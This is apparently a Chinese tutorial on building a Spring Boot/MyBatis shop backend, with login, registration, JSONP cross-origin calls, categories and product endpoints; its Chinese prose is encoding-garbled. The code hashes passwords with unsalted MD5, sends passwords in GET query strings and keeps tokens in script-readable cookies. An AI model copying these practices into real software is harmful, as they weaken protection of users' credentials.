&lt;/mapper&gt; 1.1.2 å®ŒæˆserviceåŠŸèƒ½ åˆ›å»ºæ¥å£com.sunzy.fmmall.service.UserService package com.sunzy.fmmall.service; import com.sunzy.fmmall.vo.ResultVO; public interface UserService &#123; public ResultVO login(String username, String password); public ResultVO regist(String username, String password); &#125; åˆ›å»ºå®ç°ç±» com.sunzy.fmmall.service.Impl.UserServiceImpl package com.sunzy.fmmall.service.Impl; import com.sunzy.fmmall.dao.UserDao; import com.sunzy.fmmall.entity.Users; import com.sunzy.fmmall.service.UserService; import com.sunzy.fmmall.utils.MD5Utils; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import org.springframework.stereotype.Service; import org.springframework.transaction.annotation.Transactional; import javax.annotation.Resource; import java.util.Date; @Service public class UserServiceImpl implements UserService &#123; @Resource private UserDao userDao; @Override public ResultVO login(String username, String password) &#123; Users user = userDao.queryUserByName(username); if(user == null)&#123; return new ResultVO(ResStatus.NO, &quot;ç”¨æˆ·ä¸å­˜åœ¨ï¼&quot;, null); &#125; String realPasswd = user.getPassword(); if(realPasswd.equals(MD5Utils.md5(password)))&#123; return new ResultVO(ResStatus.OK, &quot;ç™»å½•æˆåŠŸï¼&quot;, user); &#125;else &#123; return new ResultVO(ResStatus.NO, &quot;å¯†ç é”™è¯¯ï¼&quot;, null); &#125; &#125; @Transactional @Override public ResultVO regist(String username, String password) &#123; synchronized (this)&#123; // åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å·²ç»æ³¨å†Œ Users user = userDao.queryUserByName(username); if(user == null)&#123; // å°†æ–°ç”¨æˆ·ä¿¡æ¯æ·»åŠ åˆ°æ•°æ®åº“ä¸­ String md5 = MD5Utils.md5(password); user = new Users(); user.setPassword(md5); user.setUsername(username); user.setUserImg(&quot;img/default.png&quot;); user.setUserRegtime(new Date()); user.setUserModtime(new Date()); int i = userDao.insertUser(user); if(i &gt; 0)&#123; return new ResultVO(ResStatus.OK, &quot;ç”¨æˆ·æ³¨å†ŒæˆåŠŸï¼&quot;, user); &#125;else &#123; return new ResultVO(ResStatus.NO, &quot;ç”¨æˆ·æ³¨å†Œå¤±è´¥ï¼&quot;, null); &#125; &#125;else&#123; return new ResultVO(ResStatus.NO, &quot;ç”¨æˆ·å·²è¢«æ³¨å†Œï¼&quot;, null); &#125; &#125; &#125; &#125; 1.1.3 å®Œæˆcontrollerä»£ç  package com.sunzy.fmmall.controller; import com.sunzy.fmmall.entity.Users; import com.sunzy.fmmall.service.UserService; import com.sunzy.fmmall.vo.ResultVO; import io.swagger.annotations.Api; import io.swagger.annotations.ApiImplicitParam; import io.swagger.annotations.ApiImplicitParams; import io.swagger.annotations.ApiOperation; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.*; //@RequestBody @RestController @RequestMapping(&quot;/user&quot;) @Api(value = &quot;ç”¨æˆ·ç®¡ç†&quot;, tags = &quot;æä¾›ç”¨æˆ·æ³¨å†Œå’Œç™»å½•æ¥å£&quot;) public class UserController &#123; @Autowired private UserService userService; @ApiOperation(&quot;ç”¨æˆ·ç™»å½•æ¥å£&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;ç”¨æˆ·è´¦å·&quot;, required = true), @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;ç”¨æˆ·å¯†ç &quot;, required = true) &#125;) @GetMapping(&quot;/login&quot;) public ResultVO login(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password)&#123; return userService.login(username, password); &#125; @ApiOperation(&quot;ç”¨æˆ·æ³¨å†Œæ¥å£&quot;) // @ApiImplicitParams(&#123; // @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;ç”¨æˆ·æ³¨å†Œè´¦å·&quot;, required = true), // @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;ç”¨æˆ·æ³¨å†Œå¯†ç &quot;, required = true) // &#125;) @PostMapping(&quot;/regist&quot;) public ResultVO regist(@RequestBody Users user)&#123; String username = user.getUsername(); String password = user.getPassword(); return userService.regist(username, password); &#125; &#125; 1.1.4 æ¥å£æµ‹è¯• 1.2 è§£å†³å‰åç«¯è·¨åŸŸé—®é¢˜1.1 å‰ç«¯ é€šè¿‡jsonpè·¨åŸŸ é€šå¸¸ä¸ºäº†å‡è½»webæœåŠ¡å™¨çš„è´Ÿè½½ï¼Œæˆ‘ä»¬æŠŠjsã€cssï¼Œimgç­‰é™æ€èµ„æºåˆ†ç¦»åˆ°å¦ä¸€å°ç‹¬ç«‹åŸŸåçš„æœåŠ¡å™¨ä¸Šï¼Œåœ¨htmlé¡µé¢ä¸­å†é€šè¿‡ç›¸åº”çš„æ ‡ç­¾ä»ä¸åŒåŸŸåä¸‹åŠ è½½é™æ€èµ„æºï¼Œè€Œè¢«æµè§ˆå™¨å…è®¸ï¼ŒåŸºäºæ­¤åŸç†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ¨æ€åˆ›å»ºscriptï¼Œå†è¯·æ±‚ä¸€ä¸ªå¸¦å‚ç½‘å€å®ç°è·¨åŸŸé€šä¿¡ã€‚ &lt;script&gt; var script = document.createElement(&#x27;script&#x27;); script.type = &#x27;text/javascript&#x27;; // ä¼ å‚ä¸€ä¸ªå›è°ƒå‡½æ•°åç»™åç«¯ï¼Œæ–¹ä¾¿åç«¯è¿”å›æ—¶æ‰§è¡Œè¿™ä¸ªåœ¨å‰ç«¯å®šä¹‰çš„å›è°ƒå‡½æ•° script.src = &#x27;http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback&#x27;; document.head.appendChild(script); // å›è°ƒæ‰§è¡Œå‡½æ•° function handleCallback(res) &#123; alert(JSON.stringify(res)); &#125; &lt;/script&gt; 1.2 åç«¯ åªéœ€è¦åœ¨controllerä¸­æ·»åŠ @CrossOriginæ³¨è§£å³å¯å…è®¸åç«¯å“åº”æ•°æ®è¿›è¡Œè·¨åŸŸå“åº”ã€‚ 1.3 å°†ç”¨æˆ·ä¿¡æ¯æ˜¾ç¤ºåœ¨å‰ç«¯åœ¨å‰ç«¯ç™»å½•ï¼ˆlogin.htmlçš„doSubmitæ–¹æ³•ä¸­ï¼‰çš„ajaxè¯·æ±‚çš„å“åº”ä»£ç ä¸­åŠ å…¥ä»¥ä¸‹å†…å®¹ if(vo.code == 10000)&#123; //å¦‚æœç™»å½•æˆåŠŸï¼Œå°±æŠŠtokenå­˜å‚¨åˆ°cookie setCookieValue(&quot;token&quot;,vo.msg); //å°†ç”¨æˆ·æ˜µç§°å’Œç”¨æˆ·å¤´åƒçš„è·¯å¾„ä¿å­˜åœ¨cookie setCookieValue(&quot;userId&quot;,vo.data.userId); setCookieValue(&quot;username&quot;,vo.data.username); setCookieValue(&quot;userImg&quot;,vo.data.userImg) &#125; å³ç™»å½•æˆåŠŸåï¼Œå°†ç”¨æˆ·çš„tokenå’Œç”¨æˆ·ä¿¡æ¯ä¸€åŒä¿å­˜åˆ°cookieä¸­ï¼Œç”¨äºå‰ç«¯ä¼ å€¼ åœ¨index.htmlçš„createdå‡½æ•°ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç  var token = getCookieValue(&quot;token&quot;); if(token !=null &amp;&amp; token !=&quot;&quot;)&#123; this.isLogin = true; this.username = getCookieValue(&quot;username&quot;); this.userimg = getCookieValue(&quot;userImg&quot;); &#125; è·å–åˆ°ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼Œå†é€šè¿‡v-modelæ˜¾ç¤ºåˆ°å‰ç«¯é¡µé¢ä¸­ã€‚ 1.4 é¦–é¡µè½®æ’­å›¾ æ•°æ®åº“æ“ä½œå®ç° ç¼–å†™sqlè¯­å¥ SELECT * FROM index_img WHERE &#96;status&#96; &#x3D; 1 ORDER BY seq åœ¨IndexImgMapperå®šä¹‰æ–¹æ³• public interface IndexImgMapper extends GeneralDao&lt;IndexImg&gt; &#123; public List&lt;IndexImg&gt; listIndexImgs(); &#125; é…ç½®æ˜ å°„æ–‡ä»¶ &lt;select id=&quot;listIndexImgs&quot; resultType=&quot;com.sunzy.fmmall.entity.IndexImg&quot; resultMap=&quot;BaseResultMap&quot;&gt; SELECT * FROM index_img WHERE `status` = 1 ORDER BY seq &lt;/select&gt; ä¸šåŠ¡é€»è¾‘å®ç° IndexImgServiceImplæ·»åŠ ä»¥ä¸‹å†…å®¹ @Service public class IndexImgServiceImpl implements IndexImgService &#123; @Resource private IndexImgMapper indexImgMapper; @Override public ResultVO listIndeximgs() &#123; List&lt;IndexImg&gt; indexImgs = indexImgMapper.listIndexImgs(); if(indexImgs.size() == 0)&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125; return new ResultVO(ResStatus.OK, &quot;success&quot;,indexImgs); &#125; &#125; æ¥å£å®ç° IndexImgController @RestController @RequestMapping(&quot;/index&quot;) @CrossOrigin public class IndexImgsController &#123; @Autowired private IndexImgService indexImgService; @GetMapping(&quot;/indeximg&quot;) public ResultVO addGoods()&#123; return ResultVO.success(indexImgService.listIndeximgs()); &#125; &#125; 1.5 åˆ†ç±»åˆ—è¡¨æ¥å£å¼€å‘ æ•°æ®åº“åˆ†æ æ·»åŠ å®ä½“ç±»CategoryVO ä¸categoryçš„åŒºåˆ«åœ¨äºå¤šäº†ä¸€ä¸ªå±æ€§ç”¨äºå­˜æ”¾å­æ ‡é¢˜ List&lt;CategoryVO&gt; categoryVOList; daoå®ç° æ–¹æ³•ä¸€ ä½¿ç”¨é€’å½’sqlæŸ¥è¯¢æ•°æ®åº“ daoä»£ç  public List&lt;CategoryVO&gt; getCategoryList2(int parentId); mapperæ˜ å°„æ–‡ä»¶ &lt;resultMap id=&quot;ResultMap&quot; type=&quot;com.sunzy.fmmall.entity.CategoryVO&quot;&gt; &lt;!-- WARNING - @mbg.generated --&gt; &lt;id column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;category_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryName&quot; /&gt; &lt;result column=&quot;category_level&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryLevel&quot; /&gt; &lt;result column=&quot;parent_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;parentId&quot; /&gt; &lt;result column=&quot;category_icon&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryIcon&quot; /&gt; &lt;result column=&quot;category_slogan&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categorySlogan&quot; /&gt; &lt;result column=&quot;category_pic&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryPic&quot; /&gt; &lt;result column=&quot;category_bg_color&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;categoryBgColor&quot; /&gt; &lt;collection property=&quot;categoryVOList&quot; column=&quot;category_id&quot; select=&quot;com.sunzy.fmmall.dao.CategoryMapper.getCategoryList2&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;getCategoryList2&quot; resultType=&quot;com.sunzy.fmmall.entity.CategoryVO&quot; resultMap=&quot;ResultMap&quot;&gt; select * from category where parent_id = #&#123;parentId&#125; &lt;/select&gt; æ–¹æ³•äºŒ ç›´æ¥è·å–æ‰€æœ‰åˆ†ç±»çš„æ•°æ®åï¼Œåœ¨javaä»£ç ä¸­è¿›è¡Œçº§åˆ«åˆ†ç±»çš„å¤„ç†ï¼Œå¯ä»¥å¤§å¤§æé«˜å¤„ç†æ•ˆç‡ serviceä»£ç å®ç° æ–¹æ³•ä¸€ @Override public List&lt;CategoryVO&gt; getCategoryList() &#123; return categoryMapper.getCategoryList2(0); &#125; æ–¹æ³•äºŒ @Override public List&lt;CategoryVO&gt; getCategoryList() &#123; List&lt;Category&gt; categories = categoryMapper.getCategoryList(); List&lt;CategoryVO&gt; categoryVOS = new ArrayList&lt;&gt;(); // è·å–æ‰€æœ‰çš„ä¸€çº§æ ‡é¢˜ for (Category category : categories) &#123; CategoryVO categoryVO = new CategoryVO(); if(category.getCategoryLevel() == 1)&#123; BeanUtils.copyProperties(category, categoryVO); categoryVOS.add(categoryVO); &#125; &#125; // å°†ä¸€çº§æ ‡é¢˜ä¸‹çš„äºŒçº§æ ‡é¢˜æ·»åŠ åˆ°setCategoryVOListå±æ€§ä¸­ for (CategoryVO categoryVO : categoryVOS) &#123; List&lt;CategoryVO&gt; category2List = new ArrayList&lt;&gt;(); for (Category category : categories) &#123; // ç­›é€‰æ¡ä»¶ä¸º äºŒçº§æ ‡é¢˜ä¸”çˆ¶æ ‡é¢˜ä¸ä¸€çº§æ ‡é¢˜ä¸€è‡´ if(category.getCategoryLevel() == 2 &amp;&amp; category.getParentId().equals(categoryVO.getCategoryId()))&#123; CategoryVO categoryvo = new CategoryVO(); BeanUtils.copyProperties(category, categoryvo); category2List.add(categoryvo); &#125; &#125; categoryVO.setCategoryVOList(category2List); // System.out.println(categoryVO); &#125; for (CategoryVO categoryVO : categoryVOS) &#123; for(CategoryVO categoryVO2: categoryVO.getCategoryVOList())&#123; //éå†æ‰€æœ‰äºŒçº§æ ‡é¢˜ List&lt;CategoryVO&gt; category3List = new ArrayList&lt;&gt;(); //ä¿å­˜ä¸‰çº§æ ‡é¢˜çš„æ•°ç»„ for (Category category : categories) &#123; // ç­›é€‰ç¬¦åˆæ¡ä»¶çš„ä¸‰çº§æ ‡é¢˜ å­˜æ”¾åˆ°äºŒçº§æ ‡é¢˜çš„ categoryVOListä¸­ if(category.getCategoryLevel() == 3 &amp;&amp; category.getParentId().equals(categoryVO2.getCategoryId()))&#123; CategoryVO categoryvo = new CategoryVO(); BeanUtils.copyProperties(category, categoryvo); category3List.add(categoryvo); &#125; &#125; categoryVO2.setCategoryVOList(category3List); &#125; System.out.println(categoryVO); &#125; return categoryVOS; &#125; controllerå®ç° @Autowired private CategoryService categoryService; @GetMapping(&quot;/category-list&quot;) @ApiOperation(value = &quot;è·å–é¦–é¡µåˆ†ç±»æ•°æ®&quot;) public ResultVO getCategoryList()&#123; return ResultVO.success(categoryService.getCategoryList1()); // return ResultVO.success(categoryService.getCategoryList2()); &#125; å®æµ‹æ–¹æ³•äºŒæ¯”æ–¹æ³•ä¸€çš„å“åº”é€Ÿåº¦è¦å¿«å¾ˆå¤šå€ï¼Œæ‰€ä»¥è¿˜æ˜¯å‡å°‘åœ¨æ•°æ®åº“ä¸­è¿›è¡Œæ•°æ®çš„å¤„ç†ã€‚ æ–¹æ³•ä¸€ æ–¹æ³•äºŒ å®ç°æ•ˆæœå¦‚ä¸‹ 1.6 å•†å“æ¨è æ¨èå•†å“åŸåˆ™å¯ä»¥æ˜¯ 1.æ ¹æ®å•†åŸé”€é‡æ¨è2.æ¨èå•†åŸæœ€æ–°ä¸Šæ¶çš„å•†å“ è¯´æ˜ï¼šå•†å“æ¨èç®—æ³•æ˜¯æ ¹æ®å¤šä¸ªç»´åº¦è¿›è¡Œæƒé‡è®¡ç®—çš„ç»“æœï¼Œè®¡ç®—å‡ºä¸€ä¸ªåŒ¹é…å€¼ æ•°æ®åº“æ“ä½œ select * from product order by create_time desc limit 0,3; æ·»åŠ å®ä½“ç±»ProdoctVO ä¸productçš„åŒºåˆ«åœ¨äºå¤šä¸€ä¸ªå±æ€§ç”¨äºå­˜åœ¨ä¸è¯¥äº§å“ç›¸å…³çš„å›¾ç‰‡ private List&lt;ProductImg&gt; imgs; public List&lt;ProductImg&gt; getImgs() &#123; return imgs; &#125; public void setImgs(List&lt;ProductImg&gt; imgs) &#123; this.imgs = imgs; &#125; daoå®ç° ProductDao @Mapper public interface ProductMapper extends GeneralDao&lt;Product&gt; &#123; public List&lt;Product&gt; getRecommendProduct(); &#125; xml &lt;id column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;categoryId&quot; /&gt; &lt;result column=&quot;root_category_id&quot; jdbcType=&quot;INTEGER&quot; property=&quot;rootCategoryId&quot; /&gt; &lt;result column=&quot;sold_num&quot; jdbcType=&quot;INTEGER&quot; property=&quot;soldNum&quot; /&gt; &lt;result column=&quot;product_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;productStatus&quot; /&gt; &lt;result column=&quot;create_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createTime&quot; /&gt; &lt;result column=&quot;update_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updateTime&quot; /&gt; &lt;result column=&quot;content&quot; jdbcType=&quot;LONGVARCHAR&quot; property=&quot;content&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;getRecommendProduct&quot; resultType=&quot;com.sunzy.fmmall.entity.Product&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product order by create_time desc limit 0,3; &lt;/select&gt; ProductImgDao @Mapper public interface ProductImgMapper extends GeneralDao&lt;ProductImg&gt; &#123; public List&lt;ProductImg&gt; getProductImgsById(int productId); &#125; xml &lt;id column=&quot;id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;id&quot; /&gt; &lt;result column=&quot;item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;itemId&quot; /&gt; &lt;result column=&quot;url&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;url&quot; /&gt; &lt;result column=&quot;sort&quot; jdbcType=&quot;INTEGER&quot; property=&quot;sort&quot; /&gt; &lt;result column=&quot;is_main&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isMain&quot; /&gt; &lt;result column=&quot;created_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;createdTime&quot; /&gt; &lt;result column=&quot;updated_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;updatedTime&quot; /&gt; &lt;/resultMap&gt; &lt;select id=&quot;getProductImgsById&quot; resultType=&quot;com.sunzy.fmmall.entity.ProductImg&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product_img where item_id = #&#123;productId&#125; &lt;/select&gt; serviceä»£ç  @Resource private ProductMapper productMapper; @Resource private ProductImgMapper productImgMapper; @Override public List&lt;ProductVO&gt; getRecommendProductList() &#123; List&lt;Product&gt; recommendProductList = productMapper.getRecommendProduct(); List&lt;ProductVO&gt; productVOS = new ArrayList&lt;&gt;(); for (Product product : recommendProductList) &#123; ProductVO productVO = new ProductVO(); List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId())); BeanUtils.copyProperties(product, productVO); productVO.setImgs(imgs); productVOS.add(productVO); &#125; return productVOS; &#125; controllerä»£ç  @Autowired private ProductService productService; @GetMapping(&quot;/list-recommends&quot;) @ApiOperation(value = &quot;è·å–å•†å“æ¨èæ•°æ®&quot;) public ResultVO getRecommendsList()&#123; return ResultVO.success(productService.getRecommendProductList()); &#125; æµ‹è¯•ç»“æœ 1.7 åˆ†ç±»å•†å“æ¨è ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰åˆ†ç±»çš„æ¨èå•†å“ï¼Œæ•´ä½“å®Œæˆåˆå§‹åŒ– åˆ†åˆ«è·å–æ‰€æœ‰ä¸€çº§æ ‡é¢˜ä¸‹é”€é‡æœ€é«˜çš„å…­ä¸ªå•†å“ è¿”å›æŸ¥è¯¢åˆ°çš„6ä¸ªå•†å“ sqlè¯­å¥ from product where root_category_id &#x3D; rootId and product_status &#x3D; 1 order by sold_num desc limit 0,6; è·å–åˆ°rootIdä¸‹é”€é‡å‰å…­çš„å•†å“ä¿¡æ¯ dao public List&lt;Product&gt; getRecommendByCategory(int rootId); xml &lt;select id=&quot;getRecommendByCategory&quot; resultType=&quot;com.sunzy.fmmall.entity.Product&quot; resultMap=&quot;BaseResultMap&quot;&gt; select * from product where root_category_id = #&#123;rootId&#125; and product_status = 1 order by sold_num desc limit 0,6; &lt;/select&gt; service @Override public List&lt;CategoryDTO&gt; getRecommendByCategory() &#123; List&lt;Category&gt; categoryList = categoryMapper.getCategoryList(); // è·å–æ‰€æœ‰çš„åˆ†ç±» List&lt;CategoryDTO&gt; categoryDTOList = new ArrayList&lt;&gt;(); // ç”¨äºä¿å­˜ç»“æœ for (Category category : categoryList) &#123; if (category.getCategoryLevel() == 1) &#123; CategoryDTO categoryDTO = new CategoryDTO(); List&lt;ProductVO&gt; productVOList = new ArrayList&lt;&gt;(); List&lt;Product&gt; productList = productMapper.getRecommendByCategory(category.getCategoryId()); // æ ¹æ®root_category_idç­›é€‰å±äºè¯¥ä¸€çº§åˆ†ç±»çš„å•†å“ for (Product product : productList) &#123; // å°†äº§å“çš„å›¾ç‰‡æŸ¥è¯¢å‡ºæ¥åŠ å…¥åˆ°productVOçš„imgså±æ€§ä¸­ ProductVO productVO = new ProductVO(); List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId())); BeanUtils.copyProperties(product, productVO); productVO.setImgs(imgs); productVOList.add(productVO); &#125; // å°†å¤„ç†å¾—åˆ°çš„productVOListåŠ å…¥åˆ°CategoryDTOçš„productså±æ€§ä¸­ categoryDTO.setProducts(productVOList); BeanUtils.copyProperties(category, categoryDTO); categoryDTOList.add(categoryDTO); &#125; &#125; return categoryDTOList; &#125; ** è¯¥æ–¹æ³•å®ç°çš„æœ‰ç‚¹å¤æ‚ï¼Œå¹¶ä¸”æ•ˆç‡æ¯”è¾ƒä½ï¼Œå¯ä»¥é‡‡ç”¨è”åˆæŸ¥è¯¢çš„æ–¹æ³•è¿›è¡Œä¼˜åŒ– controller @GetMapping(&quot;/category-recommends&quot;) @ApiOperation(value = &quot;æ ¹æ®å•†å“åˆ†ç±»é”€é‡å‰å…­æ¨èå•†å“&quot;) public ResultVO getRecommendByCategoryList()&#123; return ResultVO.success(productService.getRecommendByCategory()); &#125; æ¥å£æµ‹è¯• å‰ç«¯å®ç°æ•ˆæœ 1.8 å•†å“è¯¦æƒ… ç‚¹å‡»é¦–é¡µæ¨èçš„å•†å“ã€è½®æ’­å›¾å•†å“å¹¿å‘Šã€å•†å“åˆ—è¡¨é¡µé¢ç‚¹å‡»å•†å“ï¼Œå°±ä¼šè¿›å…¥åˆ°å•†å“çš„è¯¦æƒ…é¡µé¢ ç”¨æˆ·ç‚¹å‡»æ—¶ï¼Œæºå¸¦å•†å“çš„idè¿›è¡Œåç«¯è¯·æ±‚ï¼Œåç«¯æ¥æ”¶åˆ°å•†å“idåï¼Œè¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œè¿”å›è¯¦ç»†ä¿¡æ¯ åŒ…æ‹¬ä»¥ä¸‹å†…å®¹ 1.å•†å“çš„åŸºæœ¬ä¿¡æ¯ 2.å•†å“çš„å¥—é¤ä¿¡æ¯ 3.å•†å“çš„å›¾ç‰‡ä¿¡æ¯ 4.å•†å“çš„è¯„ä»·ä¿¡æ¯ 5.å•†å“çš„å‚æ•°ä¿¡æ¯ å•†å“è¯¦æƒ…æ¥å£ æ¥å£æ‰€éœ€ä¿¡æ¯å¦‚ä¸‹ï¼Œåªéœ€è¦ä¸‰ä¸ªå•è¡¨æŸ¥è¯¢å³å¯å®Œæˆï¼Œå› æ­¤daoå±‚å¯ä»¥ç›´æ¥ä½¿ç”¨tkMapperæä¾›çš„æ¥å£ service public ResultVO getProductBasicInfo(String productId) &#123; //1.å•†å“åŸºæœ¬ä¿¡æ¯ Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); criteria.andEqualTo(&quot;productStatus&quot;,1);//çŠ¶æ€ä¸º1è¡¨ç¤ºä¸Šæ¶å•†å“ List&lt;Product&gt; products = productMapper.selectByExample(example); if(products.size() &gt; 0)&#123; Example exampleImg = new Example(ProductImg.class); Example.Criteria imgCriteria = exampleImg.createCriteria(); imgCriteria.andEqualTo(&quot;itemId&quot;,productId); List&lt;ProductImg&gt; productImgs = productImgMapper.selectByExample(exampleImg); Example exampleSku = new Example(ProductSku.class); Example.Criteria skuCriteria = exampleSku.createCriteria(); skuCriteria.andEqualTo(&quot;productId&quot;,productId); List&lt;ProductSku&gt; productSkus = productSkuMapper.selectByExample(exampleSku); HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;product&quot;, products.get(0)); hashMap.put(&quot;productImgs&quot;, productImgs); hashMap.put(&quot;productSkus&quot;, productSkus); return ResultVO.success(hashMap); &#125; return ResultVO.failed(&quot;æŸ¥è¯¢çš„å•†å“ä¸å­˜åœ¨&quot;); &#125; controller @RestController @CrossOrigin @RequestMapping(&quot;/product&quot;) @Api(value = &quot;æä¾›å•†å“ä¿¡æ¯ç›¸å…³çš„æ¥å£&quot;,tags = &quot;å•†å“ç®¡ç†&quot;) public class ProductController &#123; @Autowired private ProductService productService; @Autowired private ProductCommontsService productCommontsService; @ApiOperation(&quot;å•†å“åŸºæœ¬ä¿¡æ¯æŸ¥è¯¢æ¥å£&quot;) @GetMapping(&quot;/detail-info/&#123;pid&#125;&quot;) public ResultVO getProductBasicInfo(@PathVariable(&quot;pid&quot;) String pid)&#123; return productService.getProductBasicInfo(pid); &#125; &#125; æ¥å£æµ‹è¯• å•†å“å‚æ•°æ¥å£ æ¥å£æ‰€éœ€æ•°æ®å¯çŸ¥ï¼Œä¹Ÿä¸ºå•è¡¨æŸ¥è¯¢ï¼Œå› æ­¤daoå±‚å¯ä»¥ç›´æ¥ä½¿ç”¨tkMapperæä¾›çš„æ¥å£ service @Override public ResultVO getProductParamsById(String productId) &#123; //1.å•†å“åŸºæœ¬ä¿¡æ¯ Example example = new Example(Product.class); Example.Criteria criteria = example.createCriteria(); criteria.andEqualTo(&quot;productId&quot;,productId); criteria.andEqualTo(&quot;productStatus&quot;,1);//çŠ¶æ€ä¸º1è¡¨ç¤ºä¸Šæ¶å•†å“ List&lt;Product&gt; products = productMapper.selectByExample(example); if(products.size() &gt; 0)&#123; Example exampleParams = new Example(ProductParams.class); Example.Criteria criteria1 = exampleParams.createCriteria(); criteria1.andEqualTo(&quot;productId&quot;, productId); List&lt;ProductParams&gt; params = productParamsMapper.selectByExample(exampleParams); if(params.size() &gt; 0)&#123; return ResultVO.success(params.get(0)); &#125;else &#123; return ResultVO.failed(&quot;æ­¤äº§å“ä¸ºä¸‰æ— äº§å“ï¼&quot;); &#125; &#125;else &#123; return ResultVO.failed(&quot;æŸ¥è¯¢çš„å•†å“ä¸å­˜åœ¨&quot;); &#125; &#125; controller @ApiOperation(&quot;å•†å“å‚æ•°ä¿¡æ¯æŸ¥è¯¢æ¥å£&quot;) @GetMapping(&quot;/detail-params/&#123;pid&#125;&quot;) public ResultVO getProductParams(@PathVariable(&quot;pid&quot;) String pid)&#123; return productService.getProductParamsById(pid); &#125; æµ‹è¯•ç»“æœ å•†å“è¯„ä»·æ¥å£è¯„ä»·æ¥å£éœ€è¦å®Œæˆä¸¤ä¸ªåŠŸèƒ½ï¼šè¯„ä»·åˆ—è¡¨åˆ†é¡µå±•ç¤ºå’Œè¯„ä»·åˆ†æ è¯„ä»·åˆ—è¡¨åˆ†é¡µå±•ç¤º â€‹ æ¥å£æ‰€éœ€å‚æ•°å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹å‡ºéœ€è¦å…³è”ç”¨æˆ·æ•°æ®ï¼Œå› æ­¤ä¸ºå¤šè¡¨å…³è”æŸ¥è¯¢ sql select u.username, u.nickname, u.user_img, c.comm_id, c.product_id, c.product_name, c.order_item_id, c.user_id, c.is_anonymous, c.comm_type, c.comm_level, c.comm_content, c.comm_imgs, c.sepc_name, c.reply_status, c.reply_content, c.reply_time, c.is_show from product_comments c INNER JOIN users u ON u.user_id &#x3D; c.user_id WHERE c.product_id &#x3D; 3 limit 1,5 dao &lt;resultMap id=&quot;ProductCommentsVOMap&quot; type=&quot;com.qfedu.fmmall.entity.ProductCommentsVO&quot;&gt; &lt;id column=&quot;comm_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commId&quot; /&gt; &lt;result column=&quot;product_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productId&quot; /&gt; &lt;result column=&quot;product_name&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;productName&quot; /&gt; &lt;result column=&quot;order_item_id&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;orderItemId&quot; /&gt; &lt;result column=&quot;is_anonymous&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isAnonymous&quot; /&gt; &lt;result column=&quot;comm_type&quot; jdbcType=&quot;INTEGER&quot; property=&quot;commType&quot; /&gt; &lt;result column=&quot;comm_level&quot; jdbcType=&quot;INTEGER&quot; property=&quot;commLevel&quot; /&gt; &lt;result column=&quot;comm_content&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commContent&quot; /&gt; &lt;result column=&quot;comm_imgs&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;commImgs&quot; /&gt; &lt;result column=&quot;sepc_name&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;sepcName&quot; /&gt; &lt;result column=&quot;reply_status&quot; jdbcType=&quot;INTEGER&quot; property=&quot;replyStatus&quot; /&gt; &lt;result column=&quot;reply_content&quot; jdbcType=&quot;VARCHAR&quot; property=&quot;replyContent&quot; /&gt; &lt;result column=&quot;reply_time&quot; jdbcType=&quot;TIMESTAMP&quot; property=&quot;replyTime&quot; /&gt; &lt;result column=&quot;is_show&quot; jdbcType=&quot;INTEGER&quot; property=&quot;isShow&quot; /&gt; &lt;result column=&quot;user_id&quot; 